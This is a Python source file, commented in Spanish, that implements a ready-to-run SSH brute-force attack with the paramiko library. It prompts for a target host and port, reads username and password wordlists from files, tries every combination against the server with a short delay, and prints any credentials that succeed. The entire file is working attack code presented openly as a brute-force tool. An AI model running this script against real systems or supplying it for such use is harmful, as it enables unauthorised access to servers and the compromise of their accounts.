import paramiko
import socket
import time

# Función para realizar un ataque de fuerza bruta a un servidor SSH
def ssh_fuerza_bruta(hostname, port, usuario, password):
    """
    Intenta autenticar en un servidor SSH usando las credenciales proporcionadas.
    
    Args:
        hostname (str): Nombre del host o dirección IP del servidor SSH.
        port (int): Puerto en el que está corriendo el servicio SSH.
        usuario (str): Nombre de usuario para autenticar.
        password (str): Contraseña para autenticar.
    """
    # Activar el registro de eventos de Paramiko en un archivo log.log
    log = paramiko.util.log_to_file('log.log')
    
    # Crear un cliente SSH
    ssh_client = paramiko.SSHClient()
    
    # Cargar claves del sistema conocidas para la autenticación SSH
    ssh_client.load_system_host_keys()
    
    # Configurar para aceptar claves de hosts desconocidos automáticamente
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Intentar conectarse al servidor SSH con las credenciales proporcionadas
        print('Comprobando credenciales {}:{}'.format(usuario, password))
        ssh_client.connect(
            hostname, 
            port=port, 
            username=usuario, 
            password=password, 
            timeout=5
        )
        print('Credenciales correctas: {}:{}'.format(usuario, password))
    except paramiko.AuthenticationException as exception:
        # Manejar error de autenticación
        print('AuthenticationException:', exception)
    except socket.error as error:
        # Manejar error de conexión por problemas de red
        print('SocketError:', error)

# Función principal del programa
def main():
    """
    Solicita al usuario el host y puerto del servidor SSH, y realiza un ataque 
    de fuerza bruta probando combinaciones de usuarios y contraseñas.
    """
    # Solicitar al usuario los detalles del servidor SSH
    hostname = input("Introduce el nombre del host: ")
    port = int(input("Introduce el puerto: "))  # Convertir el puerto a entero
    
    # Leer listas de usuarios y contraseñas desde archivos
    with open('usuarios.txt', 'r') as users_file:
        usuarios = users_file.readlines()
    
    with open('passwords.txt', 'r') as passwords_file:
        passwords = passwords_file.readlines()
    
    print("Usuarios cargados:", usuarios)

    # Iterar por todas las combinaciones de usuario y contraseña
    for usuario in usuarios:
        for password in passwords:
            # Esperar 3 segundos entre intentos para evitar sobrecargar el servidor
            time.sleep(3)
            # Llamar a la función de fuerza bruta con las credenciales actuales
            ssh_fuerza_bruta(hostname, port, usuario.rstrip(), password.rstrip())

# Punto de entrada del programa
if __name__ == '__main__':
    main()
